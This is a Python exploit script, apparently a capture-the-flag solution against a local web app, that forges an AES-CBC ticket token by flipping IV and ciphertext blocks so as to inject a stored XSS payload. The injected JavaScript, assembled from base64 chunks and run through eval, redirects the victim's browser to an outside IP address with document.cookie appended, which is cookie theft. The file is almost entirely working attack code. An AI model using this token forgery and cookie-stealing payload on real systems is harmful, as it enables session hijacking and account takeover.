from requests import post
from bs4 import BeautifulSoup as bs
from base64 import b64decode as b64d, b64encode as b64e
from Cryptodome.Util.Padding import pad
from binascii import hexlify
from Crypto.Util.strxor import strxor

url = "http://localhost:3000"


def get_token(name):
    data = {"name": name}
    r = post(url=url + "/generate_token", data=data).text

    token = bs(r, "html.parser").find("div",{"id":"result"}).text.split(":")[1].strip()
    return token


def send_token(token):
    data = {"token": token}
    r = post(url=url + "/check_ticket", data=data).text

    response = bs(r, "html.parser").find("h3").text
    print(response)


def newIV(ex_iv, pt_block, wanted_pt_block):
    assert len(ex_iv) == 16 & len(pt_block) == 16 & len(wanted_pt_block) == 16
    aes_output = strxor(ex_iv, pt_block)
    return strxor(aes_output, wanted_pt_block)


def forgeToken():
    template = b'{"type": "VIP", "name": ""}'

    # This one is trigerring the alert and confirm the XSS
    #payload=b'{\"type\": \"'+b"B"*6 + b'A'*16 + b' onload=alert(`A' + b'A'*16 + b"`)\", \"name\": \"\"}"

    # and here we will pass any payload we want by encoding it to base64 and pass it by parts ( b += 'Dw4d' every time )
    # There will be multiple charabia blocks that contain unexpected characters,
    # so it's more probable to have an ` in those blocks which will make the payload uncorrect and it won't work
    # in order to make it work, we have to try many times, until we get the correct one :
    # while true; do python3 solve.py;done

    payload = (
        b'{"type": "'
        + b"B" * 6
        + b"A" * 16
        + b" onload=eval(`AA"
        + b"A" * 16
        + b"`,b=``,`"
        + b"A" * 8
        + b"A" * 16
    )

    script = b64e(b"window.location='http://105.101.237.228:8080/'+document.cookie")
    # script=b64e(b"alert()")
    for i in range(0, len(script), 7):
        payload += b"`,b+=`" + script[i : i + 7] + b"`,`" + b"A" * 16
    # print(len(payload))
    payload += (
        b"A" * ( - (len(payload) % 16) + 6)
        + b"`,a=atob,`"
        + b"A" * 16
        + b"`,eval(a(b)),`AA"
        + b"A" * 16
        + b'`)", "name": "'
        + b"XSS proven"
        + b'"}'
    )

    offset = len(payload) - len(template)
    payload = pad(payload, 16)
    payload_blocks = [b"A" * 16] + [
        payload[i : i + 16] for i in range(0, len(payload), 16)
    ]
    #print(payload_blocks);input()

    pt = pad(template[:-2] + b"A" * offset + b'"}', 16)
    pt_blocks = [b"A" * 16] + [pt[i : i + 16] for i in range(0, len(pt), 16)]

    ct = bytes.fromhex(b64d(get_token("A" * offset).encode()).decode())
    # print(ct);input()
    ct_blocks = [ct[i : i + 16] for i in range(0, len(ct), 16)]

    # print(payload,pt,sep='\n');input()

    assert (
        (len(pt) == len(payload))
        and (len(pt) % 16 == 0)
        and (len(ct_blocks) == len(pt_blocks) == len(payload_blocks))
    )
    # print(len(ct_blocks))
    last = []
    for i in range(0, len(ct_blocks), 2):
        # the case where we have an unpair length, then we have to treat the last block
        if (i == (len(ct_blocks) - 1)) and (len(ct_blocks) % 2 == 1):
            last.append(ct_blocks[i])
        else:
            newiv = newIV(ct_blocks[i], pt_blocks[i + 1], payload_blocks[i + 1])
            last.append(newiv)
            last.append(ct_blocks[i + 1])
    assert len(last) == len(ct_blocks)

    last = b"".join(last)
    # print(f"iv:{last[:16]}\nct:{last[16:]}")
    token = b64e(hexlify(last))

    return token


if __name__ == "__main__":
    token = forgeToken()
    print(token);input()
    send_token(token)
